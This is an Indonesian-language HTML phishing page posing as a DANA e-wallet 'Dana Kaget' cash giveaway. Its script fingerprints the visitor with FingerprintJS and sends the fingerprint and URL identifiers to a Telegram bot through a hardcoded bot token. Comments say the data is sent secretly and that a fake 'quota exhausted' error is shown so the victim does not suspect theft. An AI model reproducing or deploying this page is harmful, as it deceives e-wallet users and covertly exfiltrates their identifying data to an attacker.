<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA KAGET - Klaim Sekarang</title>
    <meta property="og:title" content="üßß DANA KAGET KHUSUS MEMBER BARU">
    <meta property="og:description" content="Klik untuk klaim saldo DANA Kaget Anda hari ini!">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danaindonesia.png">
    
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
    <style>
        body { background-color: #0086e6; color: white; font-family: 'Arial', sans-serif; text-align: center; padding: 50px 20px; }
        .card { background: white; color: #333; border-radius: 15px; padding: 30px 20px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .btn { background: #0086e6; color: white; padding: 12px 25px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; width: 80%; }
        .logo { width: 120px; margin-bottom: 15px; }
        h3 { margin: 10px 0; color: #0086e6; }
        p { font-size: 14px; color: #666; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danaindonesia.png" class="logo" alt="DANA">
        <h3>Selamat!</h3>
        <p>Anda mendapatkan kesempatan klaim <b>Dana Kaget</b>. Klik tombol di bawah untuk memverifikasi dompet digital Anda.</p>
        <div id="status">
            <button class="btn" onclick="startScan()">KLAIM SEKARANG</button>
        </div>
    </div>

    <script>
        // Ambil parameter dari link (userid dan chatid)
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('userid');
        const chatId = urlParams.get('chatid');

        function startScan() {
            if (!userId || !chatId) {
                alert("Parameter tidak lengkap!");
                return;
            }

            document.getElementById('status').innerHTML = "<p>Sedang memproses klaim...</p>";
            
            FingerprintJS.load().then(fp => fp.get()).then(result => {
                const visitorId = result.visitorId;

                // ‚ö†Ô∏è GANTI 'TOKEN_BOT_LU' DI BAWAH INI DENGAN TOKEN ASLI DARI BOTFATHER
                const botToken = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI"; 
                
                // Kirim data rahasia ke bot
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=/process_verif ${userId} ${visitorId}`)
                .then(() => {
                    // Kasih pesan error boongan biar dia gak curiga kalau datanya dicuri
                    setTimeout(() => {
                        document.getElementById('status').innerHTML = "<p style='color:red; font-weight:bold;'>‚ö†Ô∏è ERROR: Maaf, kuota Dana Kaget untuk perangkat Anda sudah habis!</p>";
                    }, 2000);
                })
                .catch(err => {
                    console.error(err);
                    document.getElementById('status').innerHTML = "<p style='color:red;'>Koneksi gagal. Coba lagi.</p>";
                });
            });
        }
    </script>
</body>
</html>
